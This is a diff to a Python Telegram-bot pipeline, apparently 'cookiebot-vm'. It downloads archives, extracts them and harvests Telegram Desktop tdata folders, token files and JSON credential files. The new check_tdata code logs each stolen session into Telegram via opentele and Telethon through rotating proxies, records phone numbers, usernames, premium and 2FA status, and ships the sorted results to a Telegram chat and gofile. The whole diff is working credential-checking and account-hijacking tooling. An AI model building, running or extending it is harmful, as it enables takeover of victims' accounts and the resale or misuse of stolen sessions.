@@ -1,4 +1,4 @@
-import glob, json, os, platform, queue, re, shutil, socket, subprocess, sys, threading, time, zipfile
+import glob, json, multiprocessing, os, platform, queue, re, shutil, socket, subprocess, sys, threading, time, zipfile
 from concurrent.futures import ProcessPoolExecutor, as_completed
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
@@ -20,7 +20,7 @@ _flush = [0.0]
 
 RULE   = "━━━━━━━━━━━━━━━━━━━━━━━━━━"
 THIN   = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
-STAGE_ICON = {'boot': '🟡', 'idle': '🟢', 'installing': '🧩', 'download': '📥', 'downloaded': '✅', 'extract': '📦', 'extracted': '✅', 'wrong_password': '🔑', 'scan': '🔍', 'authcheck': '🔎', 'packed': '🗃', 'done': '🏁', 'error': '❌', 'cancelled': '🛑', 'cancelling': '🛑', 'queued': '⏳', 'retired': '♻️', 'ttl_expired': '♻️'}
+STAGE_ICON = {'boot': '🟡', 'idle': '🟢', 'installing': '🧩', 'download': '📥', 'downloaded': '✅', 'extract': '📦', 'extracted': '✅', 'wrong_password': '🔑', 'scan': '🔍', 'authcheck': '🔎', 'tdatacheck': '🗂', 'packed': '🗃', 'done': '🏁', 'error': '❌', 'cancelled': '🛑', 'cancelling': '🛑', 'queued': '⏳', 'retired': '♻️', 'ttl_expired': '♻️'}
 VM_TTL = 3600
 class _Ref:
     ref = 'rojaskomar67-ops/cookiebot-vm'
@@ -130,6 +130,15 @@ def stage_panel(p: dict) -> str:
         lines.append(f"⏳ {code(p.get('expired', 0))} expired   "
                      f"❌ {code(p.get('dead', 0))} dead   "
                      f"⚠️ {code(p.get('err', 0))} error   🌍 {code(p.get('proxies', 0))} proxies")
+
+    if stage == "tdatacheck" and p.get("tk_total"):
+        lines.append(f"🗃 {code('%d folders' % p.get('tk_total', 0))}"
+                     f"  {bar((p.get('tk_done') or 0) * 100 // max(p.get('tk_total'), 1))}")
+        lines.append(f"✅ {code(p.get('tk_valid', 0))} valid "
+                     f"(👑 {code(p.get('tk_prem', 0))} premium · 🔒 {code(p.get('tk_2fa', 0))} 2FA)")
+        lines.append(f"🧊 {code(p.get('tk_frozen', 0))} frozen   "
+                     f"💀 {code(p.get('tk_dead', 0))} dead   ⏳ {code(p.get('tk_err', 0))} retrying"
+                     f"   🌍 {code(p.get('tk_proxies', 0))} proxies")
 
     if stage == "error" and p.get("err"):
         lines.append(f"⚠️ {bold('Error')}: {code(p.get('err'))}")
@@ -360,6 +369,72 @@ def scan_chunk(paths):
     return [scan_file(p) for p in paths]
 
 # ── 1. download ──
+PD_HOSTS   = ("pixeldrain.com", "pixeldrain.net", "pixeldra.in", "pixeldrain.nl",
+              "pixeldrain.biz", "pixeldrain.tech", "pixeldrain.dev")
+PD_PROXIES = ("pd.cybar.xyz", "pd.1drv.eu.org")      # mirrors, they take bare /<id>
+PD_ID      = re.compile(r"[A-Za-z0-9_-]{4,20}\Z")
+PD_ARC     = re.compile(r"\.(zip|rar|7z|tar|gz|tgz)\Z", re.I)
+PD_HDRS    = {"User-Agent": "Mozilla/5.0"}
+
+def pd_host(url):
+    m = re.search(r"https?://([^/\s?#]+)", url)
+    return m.group(1).lower() if m else ""
+
+def pd_parts(url, host):
+    """('file' | 'list', id, item, err) — err only when the link is Pixeldrain but
+    names nothing we can pull (so aria2c never streams an HTML page)."""
+    segs = [s for s in url.split("://", 1)[1][len(host):].split("#")[0]
+            .split("?")[0].split("/") if s]
+    im = re.search(r"item=(\d+)", url.split("#", 1)[1] if "#" in url else "")
+    item = int(im.group(1)) if im else None
+    if len(segs) > 2 and segs[0] == "api" and segs[1] in ("file", "list"):
+        return ("list" if segs[1] == "list" else "file"), segs[2], item, None
+    if len(segs) > 1 and segs[0] in ("u", "f", "l") and PD_ID.match(segs[1]):
+        return ("list" if segs[0] == "l" else "file"), segs[1], item, None
+    if len(segs) == 1 and host in PD_PROXIES and PD_ID.match(segs[0]):
+        return "file", segs[0], item, None
+    if segs[:1] == ["d"]:
+        return None, None, None, "pixeldrain folder (/d/) link — send one /u/ archive link"
+    return None, None, None, "no file id in that pixeldrain link (…/u/XXXXXXXX)"
+
+def resolve(url):
+    """(direct URL, filename, size, err). Pixeldrain share pages are HTML, so
+    /u/ and /l/ links become the real API download URL; every other link is
+    handed to aria2c untouched. /info matters — plain /api/file/<id> IS the file."""
+    host = pd_host(url)
+    if host not in PD_HOSTS + PD_PROXIES:
+        return url, None, 0, None
+    kind, pid, item, err = pd_parts(url, host)
+    if err:
+        return None, None, 0, err
+    api = "https://%s/api/" % ("pixeldrain.com" if host in PD_PROXIES else host)
+    try:
+        body = requests.get((api + "list/" + pid) if kind == "list"
+                            else (api + "file/" + pid + "/info"),
+                            timeout=30, headers=PD_HDRS).json()
+    except Exception as e:
+        return None, None, 0, "pixeldrain lookup failed: %s" % str(e)[:90]
+    if not body.get("success", True):
+        return None, None, 0, "pixeldrain: %s" % (body.get("message") or
+                                                  body.get("value") or "link not found")
+    files = [f for f in (body.get("files") if kind == "list" else [body])
+             if isinstance(f, dict) and f.get("name")]
+    if not files:
+        return None, None, 0, "pixeldrain: nothing behind that link (deleted, private or empty)"
+    if item is not None and item < len(files):
+        files = [files[item]]
+    if len(files) > 1:
+        files = [f for f in files if PD_ARC.search(f["name"])]
+        if not files:
+            return None, None, 0, "pixeldrain folder holds no .zip/.rar/.7z archive"
+    pick = max(files, key=lambda f: f.get("size") or 0)
+    avail = (pick.get("availability") or "").strip()
+    if avail:
+        return None, None, 0, "pixeldrain: %s" % (pick.get("availability_message") or avail)
+    return (api + "file/%s?download" % (pick.get("id") or pid),
+            re.sub(r'[\\/:*?"<>|]+', "_", pick["name"])[:100],
+            int(pick.get("size") or 0), None)
+
 def download(url):
     dest = WORK / "dl"; dest.mkdir(parents=True, exist_ok=True)
     _state["err"] = None
@@ -372,6 +447,14 @@ def download(url):
                        size=fs(os.path.getsize(cand)),
                        msg="same link — reusing the archive already on this VM")
                     return Path(cand)
+    src, fname, fsize, err = resolve(url)
+    if err:
+        _state["err"] = err
+        st("error", err=err); return None
+    if src != url:
+        st("download", 4, msg="pixeldrain link resolved → %s (%s)"
+           % (fname or "?", fs(fsize) if fsize else "?"))
+        url = src
     if not shutil.which("aria2c"):
         st("installing", 3); apt(["aria2", "p7zip-full", "unrar-free"])
     use_aria = shutil.which("aria2c") is not None
@@ -382,7 +465,10 @@ def download(url):
         cmd = [ "aria2c", "--dir", str(dest), "--split=16", "--max-connection-per-server=16",
                 "--min-split-size=1M", "--file-allocation=none", "--auto-file-renaming=false",
                 "--allow-overwrite=true", "--console-log-level=warn", "--summary-interval=1",
-                "--user-agent=Mozilla/5.0", url ]
+                "--user-agent=Mozilla/5.0" ]
+        if fname:
+            cmd += ["--out", fname]
+        cmd.append(url)
         pr = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                               text=True, errors="ignore", bufsize=1)
         pe = re.compile(r"\[#\w+\s+([\d.]+\w+)/([\d.]+\w+)\((\d+)%\)")
@@ -408,7 +494,7 @@ def download(url):
                (pr.returncode, " ".join(tail[-3:])[:150]))
             return None
     else:
-        found = slow_dl(url, dest, t0)
+        found = slow_dl(url, dest, t0, fname)
         if found is None:
             st("error", err=_state.get("err") or "download_failed"); return None
     if not found or not os.path.isfile(found):
@@ -428,10 +514,10 @@ def download(url):
        dl_time=ft(time.time() - t0))
     return Path(found)
 
-def slow_dl(url, dest, t0):
+def slow_dl(url, dest, t0, name=None):
     import requests
     from urllib.parse import unquote
-    nm = unquote(url.split("?")[0].rstrip("/").split("/")[-1])
+    nm = name or unquote(url.split("?")[0].rstrip("/").split("/")[-1])
     if not re.search(r"\.(zip|rar|7z)$", nm, re.I): nm = "archive.zip"
     tgt = dest / nm
     with requests.get(url, stream=True, timeout=900,
@@ -602,7 +688,8 @@ def search_pack(ex, want_auth=True):
         chunks = [files[i:i + size] for i in range(0, tot, size)]
         # parsing is I/O bound, so oversubscribe the cores (2× vCPU, min 4)
         nw = min(len(chunks), max(4, CORES * 2))
-        with ProcessPoolExecutor(max_workers=nw) as ex_pool:
+        mp_ctx = multiprocessing.get_context("fork")
+        with ProcessPoolExecutor(max_workers=nw, mp_context=mp_ctx) as ex_pool:
             futs = [ex_pool.submit(scan_chunk, c) for c in chunks]
             scanned = found_c = 0
             for fut in as_completed(futs):
@@ -702,6 +789,72 @@ def gofile(path):
 
 SPECS = {}
 Q = queue.Queue()
+TG_CAP = 45 << 20          # stays clear of Telegram's 50 MB bot upload limit
+
+def split_zip(zp):
+    """Roll an oversized zip into <name>.partN.zip files, each a valid archive on
+    its own. Entries are copied whole (STORED — re-deflating an already packed
+    inner zip buys nothing and burns a core), and found_in.txt is repeated in
+    every part so no part loses its manifest."""
+    idx, raw, cur = 0, 0, None
+    with zipfile.ZipFile(zp) as src:
+        infos = [i for i in src.infolist() if not i.is_dir()]
+        man = next((i for i in infos if i.filename.lower() == "found_in.txt"), None)
+        blob_man = src.read(man) if man else None
+        for inf in infos:
+            if inf is man:
+                continue
+            blob = src.read(inf)
+            if cur is not None and raw + len(blob) > TG_CAP:
+                cur.close(); cur = None
+            if cur is None:
+                idx += 1
+                cur = zipfile.ZipFile(OUT / ("%s.part%d.zip" % (zp.stem, idx)),
+                                      "w", zipfile.ZIP_STORED)
+                raw = 0
+                if blob_man is not None:
+                    cur.writestr(man.filename, blob_man)
+            cur.writestr(inf, blob, zipfile.ZIP_STORED)
+            raw += len(blob)
+            if raw > TG_CAP:                 # one entry alone breaks the cap
+                sys.stdout.write("part %d holds a %s entry that is too big for "
+                                 "Telegram on its own\n" % (idx, fs(raw)))
+                sys.stdout.flush()
+        if cur is not None:
+            cur.close()
+    return [p for p in (OUT / ("%s.part%d.zip" % (zp.stem, i)) for i in range(1, idx + 1))
+            if p.exists() and p.stat().st_size > 0]
+
+def ship(zp, cap):
+    """Send one result zip. Telegram-sized files go whole; anything bigger is
+    split into parts and the complete archive is handed over as a gofile link —
+    nobody wants to re-join parts by hand. cap(size, idx, count, total, split)
+    builds the caption. Returns (parts sent, full-zip link or None)."""
+    tot = zp.stat().st_size if zp.exists() else 0
+    if not tot:
+        return 0, None
+    if tot <= TG_CAP:
+        return (1 if upload(str(zp), cap(tot, 1, 1, tot, False)) else 0), None
+    parts = split_zip(zp)
+    sent = sum(1 for i, p in enumerate(parts, 1)
+               if upload(str(p), cap(p.stat().st_size, i, len(parts), tot, True)))
+    if not sent:
+        return 0, None
+    url = gofile(str(zp))
+    if not url:
+        sys.stdout.write("gofile link for %s failed\n" % zp.name); sys.stdout.flush()
+    for p in parts:
+        try: p.unlink()
+        except Exception: pass
+    return sent, url
+
+def ship_note(idx, count, size, tot, split, label):
+    """Shared size / part line for every shipped archive."""
+    if split:
+        return (f"📦 {bold('Part')}    {code(idx)} / {code(count)}\n"
+                f"✂️ {bold('Split')}   {code(fs(tot))} broke Telegram's 50 MB cap — "
+                f"the whole {code(label)} rides on the link below\n")
+    return f"📦 {bold('Size')}   {code(fs(size))}\n"
 
 def deliver(packed, task):
     """Post every domain zip (and each part of a split domain) to the chat.
@@ -747,13 +900,22 @@ def deliver_auth(auths):
     if zp is None:
         return False, None
     shown = "\n".join(code("%s ← %s" % (n, r[:58])) for n, r in rels[:10])
+    size_line = f"📦 {bold('Size')}   {code(fmt_size(zp.stat().st_size))}\n"
     cap = (f"{gold_header('AUTH.JSON FILES', esc(str(len(auths)) + ' found'))}\n{THIN}\n"
-           f"📦 {bold('Size')}   {code(fmt_size(zp.stat().st_size))}\n"
-           f"🗂 {bold('Names')}  1st_auth.json, 2nd_auth.json …\n"
+           + size_line
+           + f"🗂 {bold('Names')}  1st_auth.json, 2nd_auth.json …\n"
            + shown
            + ("\n…" if len(rels) > 10 else ""))
     if not TG or not CHAT:
         return False, None
+    if zp.stat().st_size > TG_CAP:
+        def auth_cap(size, idx, count, tot, split):
+            return (cap.replace(size_line, "") + "\n"
+                    + ship_note(idx, count, size, tot, split, "auth.zip")
+                    + f"🔎 {bold('Re-check')}  parts cannot be re-downloaded as one "
+                      f"archive, so the bot-side proxy check is skipped for this job")
+        sent_parts, _ = ship(zp, auth_cap)
+        return sent_parts > 0, None
     try:
         with open(zp, "rb") as fh:
             r = requests.post(TG_API + "sendDocument",
@@ -1048,41 +1210,570 @@ def check_auths(auths):
             "ck_proxies": len(proxies)}
 
 def find_tdata(root):
-    """Every Telegram tdata folder at any depth (tdata, tdata1, tdata2…)."""
+    """Exact-name match first: every folder literally named tdata / tdata2…
+    at any depth. If NOTHING in the archive is named tdata, the signature
+    files catch it (D877F783D4D88E81, map0/map1, key_datas, usertag…)."""
     out = []
     for p in root.rglob("*"):
         try:
-            if not p.is_dir():
-                continue
+            is_dir = p.is_dir()
         except OSError:
             continue
+        if not is_dir:
+            continue
         n = p.name.lower()
-        if n == "tdata" or (n.startswith("tdata") and (len(n) == 5 or n[5:].isdigit())):
-            # skip nested tdata subfolders already covered by a parent hit
-            if not any(a != p and str(p).startswith(str(a) + os.sep) for a in out):
+        if n == "tdata" or (n.startswith("tdata")
+                            and (len(n) == 5 or n[5:].isdigit())):
+            if not any(str(p).startswith(str(a) + os.sep) for a in out):
                 out.append(p)
-    return out
+    sig = {"d877f783d4d88e81", "map0", "map1", "key_datas", "usertag",
+           "shortcuts-default", "key_data"}
+    extra = []
+    for p in root.rglob("*"):
+        try:
+            is_dir = p.is_dir()
+        except OSError:
+            continue
+        if not is_dir:
+            continue
+        try:
+            names = {c.name.lower() for c in p.iterdir()}
+        except OSError:
+            continue
+        if not sig & names:
+            continue
+        covered = any(str(p) == str(a) or str(p).startswith(str(a) + os.sep)
+                      for a in out + extra)
+        if not covered:
+            extra.append(p)
+    return out + extra
 
 def pack_tdata(dirs):
-    """All found folders in ONE tdata.zip under td_1st/, td_2nd/… prefixes."""
+    """tdata.zip holds every found folder as a PLAIN folder tree — no zip inside
+    a zip. Each entry is keyed by the folder's own path inside the extracted
+    archive, so hundreds of folders all named "tdata" never collide, and
+    found_in.txt maps every path back to where it came from."""
     if not dirs:
         return None, 0
     zp = OUT / "tdata.zip"
-    total = 0
-    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
-        for i, d in enumerate(dirs, 1):
-            pre = "td_%s_%s" % (ordn(i), re.sub(r"[^\w.-]", "_", d.name.lower()))
-            n = 0
+    manifest, total, used = [], 0, {""}
+    roots = [WORK / "ex", WORK / "tdex", WORK / "tdfull"]
+    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as big:
+        for d in dirs:
+            rel = d.name
+            for root in roots:
+                try:
+                    rel = str(d.relative_to(root))
+                except Exception:
+                    continue
+                if root != WORK / "ex":
+                    rel = "%s/%s" % (root.name, rel)
+                break
+            rel = re.sub(r"[^\w./-]", "_", rel.strip("/")) or d.name
+            while rel.lower() in used:                     # two hunt passes, same path
+                rel = rel + "_2"
+            used.add(rel.lower())
+            files = 0
             for f in sorted(d.rglob("*")):
                 try:
                     if f.is_file():
-                        z.write(f, pre + "/" + str(f.relative_to(d)))
-                        n += 1
+                        big.write(str(f), "%s/%s" % (rel, f.relative_to(d)))
+                        files += 1
                 except Exception:
                     pass
-            if not n:
-                z.writestr(pre + "/EMPTY", "")
+            if files:
+                total += 1
+                manifest.append("%s/  (%d files)" % (rel, files))
+            else:
+                manifest.append("(empty) %s/" % rel)
+        big.writestr("found_in.txt",
+                     "TDATA FOLDERS IN THIS ARCHIVE\n%s\nEvery folder below is a plain\n"
+                     "folder inside tdata.zip (unzip and use it directly):\n\n%s\n" %
+                     ("=" * 48, "\n".join(manifest)))
+    return zp, total
+
+TOKEN_NAMES = ("tokens.txt", "token.txt")
+
+def check_tdata(tdirs):
+    """Runs on the RUNNER: proxy-check every tdata. Live card, buckets zip.
+    Returns tk_* dict for the payload. Never raises."""
+    from concurrent.futures.thread import ThreadPoolExecutor
+    out = {"tk_total": len(tdirs), "tk_valid": 0, "tk_prem": 0, "tk_2fa": 0,
+           "tk_frozen": 0, "tk_dead": 0, "tk_err": 0, "tk_zip": False}
+    if stop():
+        return out
+    if not tdirs:
+        return out
+    proxies = auth_fetch_proxies()
+    out["tk_proxies"] = len(proxies)
+    sys.stdout.write("tdcheck: %d folders, %d proxies\n"
+                     % (len(tdirs), len(proxies))); sys.stdout.flush()
+    tick("tdatacheck", 90, tk_total=out["tk_total"], tk_done=0,
+         tk_valid=0, tk_prem=0, tk_2fa=0, tk_frozen=0, tk_dead=0, tk_err=0,
+         tk_proxies=len(proxies))
+
+    # opentele turns a tdata folder into a real telethon client; telethon
+    # needs python-socks to hop through the HTTP proxies. No VPN, no VM apps —
+    # everything is fetched at check time on the runner itself.
+    def ensure_pkgs():
+        for pkg in ("opentele", "python-socks"):
+            try:
+                __import__(pkg)
+                continue
+            except ImportError:
+                pass
+            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet",
+                            pkg], timeout=600,
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        try:
+            import opentele  # noqa
+            return True
+        except Exception as e:
+            sys.stdout.write("tdcheck: opentele unavailable: %s\n" % e)
+            sys.stdout.flush()
+            return False
+    if not ensure_pkgs():
+        sys.stdout.write("tdcheck: package install failed — aborting cleanly\n")
+        sys.stdout.flush()
+        out["tk_err"] = len(tdirs)
+        tick("tdatacheck", 96, **out)
+        return out
+
+    def parse_proxy(p):
+        m = re.match(r"(\w+)://(?:([^:@]+)(?::([^@]*))?@)?([^:/]+)(?::(\d+))?", p)
+        if not m:
+            return None
+        scheme, user, pw, host, port = m.groups()
+        return (scheme.lower() or "http", user, pw, host, int(port or 80))
+
+    # state per folder
+    seen = set()
+    dedup = []
+    for d in tdirs:
+        rp = os.path.realpath(str(d))
+        if rp not in seen:
+            seen.add(rp)
+            dedup.append(d)
+    tdirs = dedup
+    out["tk_total"] = len(tdirs)
+    res = [dict(orig=str(d), status="err", reason="", phone="-", user="-",
+                prem=False, tfa=False, proxy="-") for d in tdirs]
+    MAX_TRY = 2
+
+    # ── dedicated "TDATA CHECKING" progress card (its own message) ──
+    CARD = {"t": 0.0}
+
+    def td_card(force=False):
+        """Paint the separate live checking card — throttled to 1 edit/12s."""
+        if not force and time.time() - CARD["t"] < 12:
+            return
+        CARD["t"] = time.time()
+        done = [r for r in res if r["status"] != "err"]
+        pend = [r for r in res if r["status"] == "err"]
+        v = [r for r in done if r["status"] == "valid"]
+        pct_v = (len(done) * 100 // max(len(res), 1)) if res else 100
+        txt = (f"{gold_header('TDATA CHECKING', esc('%d / %d folders' %
+               (len(done), len(res))))}\n{THIN}\n"
+               f"{bar(pct_v)}\n"
+               f"✅ {bold('Valid')}  {code(len(v))}  ·  👑 {bold('Premium')}  "
+               f"{code(sum(1 for r in v if r['prem']))}  ·  🔒 {bold('2FA')}  "
+               f"{code(sum(1 for r in v if r['tfa']))}\n"
+               f"🧊 {bold('Frozen')}  {code(sum(1 for r in done if r['status'] == 'frozen'))}"
+               f"  ·  💀 {bold('Dead')}  {code(sum(1 for r in done if r['status'] == 'dead'))}\n"
+               f"⏳ {bold('Checking')} {code(len(pend))}  ·  🌍 {bold('Proxies')} "
+               f"{code(len(proxies) or 1)}"
+               + (f"  ·  🗒 {bold('Now')} {code(Path(pend[0]['orig']).name[:38])}"
+                  if pend else ""))
+        try:
+            new_card(txt)
+        except Exception:
+            pass
+
+    def progress():
+        done = [r for r in res if r["status"] in ("valid", "frozen", "dead")]
+        v = [r for r in done if r["status"] == "valid"]
+        tick("tdatacheck", 90, tk_total=out["tk_total"], tk_done=len(done),
+             tk_valid=len(v), tk_prem=sum(1 for r in v if r["prem"]),
+             tk_2fa=sum(1 for r in v if r["tfa"]),
+             tk_frozen=sum(1 for r in done if r["status"] == "frozen"),
+             tk_dead=sum(1 for r in done if r["status"] == "dead"),
+             tk_err=sum(1 for r in res if r["status"] == "err"),
+             tk_proxies=len(proxies))
+        td_card()
+
+    def check_one(i, seed):
+        r = res[i]
+        tdir = r["orig"]
+        proxy = None
+        if proxies and seed < MAX_TRY - 1:
+            proxy = proxies[(seed * 7919 + i) % len(proxies)]
+        r["proxy"] = proxy or "direct"
+        from telethon import errors, functions
+        from opentele.td import TDesktop
+        prox = None
+        if proxy:
+            scheme, user, pw, host, port = parse_proxy(proxy)
+            import socks
+            t = {"http": socks.HTTP, "socks4": socks.SOCKS4,
+                 "socks5": socks.SOCKS5}.get(scheme, socks.SOCKS5)
+            prox = (t, host, port, True, user, pw)
+        try:
+            td = TDesktop(tdir)
+            if not td.isLoaded():
+                raise RuntimeError("tdata folder failed to load/decrypt")
+            c = td.ToTelethon(session=str(WORK / ("tks_%d" % i)), proxy=prox)
+
+            import asyncio
+            async def _m():
+                try:
+                    await c.connect()
+                    if not c.is_user_authorized():
+                        raise errors.UnauthorizedError(
+                            None) if hasattr(errors, "UnauthorizedError") \
+                            else RuntimeError("unauthorized")
+                    me = await c.get_me()
+                    full = await c(functions.users.GetFullUserRequest(me.id))
+                    prem = bool(getattr(full.full_user, "premium", False))
+                    try:
+                        pwq = await c(functions.account.GetPasswordRequest())
+                        tfa = bool(getattr(pwq, "current_algo", None))
+                    except Exception:
+                        tfa = False
+                    phone = getattr(me, "phone_number", "") or "-"
+                    uname = ("@" + me.username) if getattr(me, "username",
+                                                           None) else (me.first_name or "-")
+                    return "valid", "", str(phone), str(uname), prem, tfa
+                finally:
+                    try: await c.disconnect()
+                    except Exception: pass
+            loop = asyncio.new_event_loop()
+            try:
+                ret = loop.run_until_complete(asyncio.wait_for(_m(), 90))
+            finally:
+                loop.close()
+            st_, why, phone, uname, prem, tfa = ret
+            r.update(status=st_, reason=why, phone=phone, user=uname,
+                     prem=prem, tfa=tfa)
+        except Exception as e:
+            n, m = type(e).__name__, str(e)[:90]
+            if "DeactivatedBan" in n or "deactivated, ban" in m.lower() \
+                    or "banned" in m.lower():
+                r.update(status="frozen", reason=m)
+            elif "UserDeactivated" in n or "SessionRevoked" in n \
+                    or "AuthKeyUnregistered" in n or "Unauthorized" in n \
+                    or "revoked" in m.lower() or "unregistered" in m.lower():
+                r.update(status="dead", reason=m)
+            else:
+                r.update(status="err", reason=m)
+        finally:
+            for f in (WORK / ("tks_%d.session" % i),
+                      WORK / ("tks_%d.session-journal" % i)):
+                try: f.unlink(missing_ok=True)
+                except Exception: pass
+
+    tstart = time.time()
+    td_card(True)
+    for seed in range(MAX_TRY):
+        if stop():
+            return {}
+        pend = [i for i, r in enumerate(res) if r["status"] == "err"]
+        if not pend:
+            break
+        progress()
+        for k in range(0, len(pend), 5):
+            if stop():
+                return {}
+            with ThreadPoolExecutor(
+                    max_workers=min(5, len(pend) - k)) as exr:
+                for _ in exr.map(check_one, pend[k:k + 5], [seed] * (len(pend) - k)):
+                    if stop():
+                        return {}
+            progress()
+    td_card(True)
+    sys.stdout.write("tdcheck rounds done in %.1fs\n"
+                     % (time.time() - tstart)); sys.stdout.flush()
+
+    # leftovers still error → dead bucket target but reported honestly
+    for r in res:
+        if r["status"] == "err":
+            r["status"] = "dead"
+            r["reason"] = "unreachable after %d attempts: %s" % (MAX_TRY, r["reason"])
+
+    valid = [r for r in res if r["status"] == "valid"]
+    prem  = [r for r in valid if r["prem"]]
+    free  = [r for r in valid if not r["prem"]]
+    twofa = [r for r in valid if r["tfa"]]
+    fro   = [r for r in res if r["status"] == "frozen"]
+    dead  = [r for r in res if r["status"] == "dead"]
+    out.update(tk_valid=len(valid), tk_prem=len(prem), tk_2fa=len(twofa),
+               tk_frozen=len(fro), tk_dead=len(dead), tk_err=0)
+    tick("tdatacheck", 96, tk_total=out["tk_total"], tk_done=len(res),
+         tk_valid=len(valid), tk_prem=len(prem), tk_2fa=len(twofa),
+         tk_frozen=len(fro), tk_dead=len(dead), tk_err=0,
+         tk_proxies=len(proxies))
+
+    def tline(r):
+        return ("Folder: %s\nPhone: %s | User: %s | Premium: %s | 2FA: %s\n"
+                "Status: %s | %s\nProxy: %s\n%s\n"
+                % (r["orig"].replace(str(WORK / "ex") + "/", "")
+                   .replace(str(WORK / "tdex") + "/", "")
+                   .replace(str(WORK / "tdfull") + "/", ""),
+                   r.get("phone", "-"), r.get("user", "-"),
+                   "YES" if r.get("prem") else "no",
+                   "YES" if r.get("tfa") else "no",
+                   r["status"], r.get("reason", ""),
+                   r.get("proxy", "-"), "-" * 48))
+
+    # buckets: VALID(VALID_P/VALID_F) FROZEN DEAD + copies of the checked folders
+    try:
+        (OUT / "tdresults").mkdir(parents=True, exist_ok=True)
+        BASE = WORK / "ex"
+        for fold, rows in (("VALID", valid), ("FROZEN", fro), ("DEAD", dead)):
+            if not rows:
+                continue
+            d = OUT / "tdresults" / fold
+            d.mkdir(parents=True, exist_ok=True)
+            hits = ""
+            for n, r in enumerate(rows, 1):
+                tag = re.sub(r"[^\w.-]", "_",
+                             r["orig"].replace(str(BASE) + "/", ""))[-60:]
+                info = d / ("%s.txt" % tag)
+                info.write_text(tline(r), encoding="utf-8")
+                hits += tline(r)
+            (d / "hits.txt").write_text(hits, encoding="utf-8")
+        with open(OUT / "tdresults/all_results.json", "w", encoding="utf-8") as f:
+            json.dump(res, f, ensure_ascii=False)
+        with open(OUT / "tdresults/proxies_used.txt", "w", encoding="utf-8") as f:
+            f.write("\n".join(proxies) + "\n")
+    except Exception as e:
+        sys.stdout.write("tdcheck buckets: %s\n" % e); sys.stdout.flush()
+
+    report = ("==================================================\n   TDATA CHECKER REPORT\n"
+              "   %s\n" % time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) +
+              "==================================================\n\n"
+              "Total tdata folders   : %d\n" % len(res) +
+              "Proxies used          : %d\n\n" % len(proxies) +
+              "VALID sessions        : %d\n" % len(valid) +
+              "  PREMIUM             : %d\n" % len(prem) +
+              "  FREE                : %d\n" % len(free) +
+              "2FA on                : %d\n" % len(twofa) +
+              "FROZEN / deactivated  : %d\n" % len(fro) +
+              "DEAD / revoked        : %d\n\n" % len(dead) +
+              "--- VALID ---\n" + ("".join(tline(r) for r in valid) or "  none\n") +
+              ("--- FROZEN ---\n%s" % "".join(tline(r) for r in fro) if fro else "") +
+              ("--- DEAD ---\n%s" % "".join(tline(r) for r in dead) if dead else ""))
+    zpath = OUT / "tdata_report.zip"
+    with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
+        z.writestr("report.txt", report)
+        for fp in sorted((OUT / "tdresults").rglob("*")):
+            if fp.is_file():
+                z.write(fp, str(fp.relative_to(OUT / "tdresults")))
+    def tdcap(size, idx, count, tot, split):
+        return (f"{gold_header('TDATA CHECK DONE', esc(str(len(res)) + ' folders'))}"
+                f"\n{THIN}\n"
+                f"✅ {bold('Valid')}     {code(len(valid))}  👑 {bold('Premium')}  "
+                f"{code(len(prem))} · ⛅ {bold('Free')}  {code(len(free))}\n"
+                f"🔒 {bold('2FA on')}   {code(len(twofa))}\n"
+                f"🧊 {bold('Frozen')}    {code(len(fro))}  ·  💀 {bold('Dead')}  "
+                f"{code(len(dead))}\n"
+                f"🌐 {bold('Proxies')}   {code(len(proxies) or 1)} · live feed\n"
+                + ship_note(idx, count, size, tot, split, "tdata_report.zip"))
+    n_parts, link = ship(zpath, tdcap)
+    if link:
+        out["tk_link"] = link
+    out["tk_zip"] = n_parts > 0
+    return out
+
+
+def find_tokens(roots):
+    """Every tokens.txt / token.txt in the extracted trees — Telegram Desktop
+    clients drop these next to (or beside) the tdata folders."""
+    out = []
+    for root in roots:
+        try:
+            if not root.exists():
+                continue
+            for p in root.rglob("*"):
+                try:
+                    if p.is_file() and p.name.lower() in TOKEN_NAMES:
+                        out.append(p)
+                except OSError:
+                    continue
+        except OSError:
+            continue
+    return out
+
+def pack_tokens(files):
+    """tokens.zip: each file becomes <the folder it was found in>_file_token.txt,
+    duplicates get _2/_3, and found_in.txt maps every name back to its origin
+    path inside the archive."""
+    if not files:
+        return None, 0
+    zp = OUT / "tokens.zip"
+    manifest, used, total = [], {""}, 0
+    base = WORK / "ex"
+    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
+        for p in files:
+            folder = re.sub(r"[^\w.-]", "_", p.parent.name) or "root"
+            name, k = "%s_file_token.txt" % folder, 2
+            while name.lower() in used:
+                name = "%s_file_token_%d.txt" % (folder, k)
+                k += 1
+            used.add(name.lower())
+            try:
+                z.write(str(p), name)
+            except Exception:
+                continue
+            try:
+                rel = str(p.relative_to(base))
+            except Exception:
+                rel = str(p)
+            manifest.append("%s  <-  %s" % (name, rel))
             total += 1
+        if not total:
+            zp.unlink(missing_ok=True)
+            return None, 0
+        z.writestr("found_in.txt",
+                   "TOKEN FILES FOUND IN THE ARCHIVE\n%s\n%s\n" %
+                   ("=" * 48, "\n".join(manifest)))
+    return zp, total
+
+def find_json(roots):
+    """Every .json in the trees except auth.json (that one has its own flow)."""
+    out = []
+    for root in roots:
+        try:
+            if not root or not Path(root).exists():
+                continue
+            for p in root.rglob("*"):
+                try:
+                    if p.is_file() and p.name.lower().endswith(".json") \
+                            and p.name.lower() != "auth.json":
+                        out.append(p)
+                except OSError:
+                    continue
+        except OSError:
+            continue
+    return out
+
+def pack_json(files):
+    """json_files.zip: every JSON with its ORIGINAL name; duplicate names get
+    name_#1.json, name_#2.json… found_in.txt maps each to its origin path."""
+    if not files:
+        return None, 0
+    zp = OUT / "json_files.zip"
+    used, manifest, total = {"", }, [], 0
+    base = WORK / "ex"
+    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
+        for p in files:
+            stem, ext = os.path.splitext(p.name)
+            name, k = p.name, 1
+            while name.lower() in used:
+                name = "%s_#%d%s" % (stem, k, ext)
+                k += 1
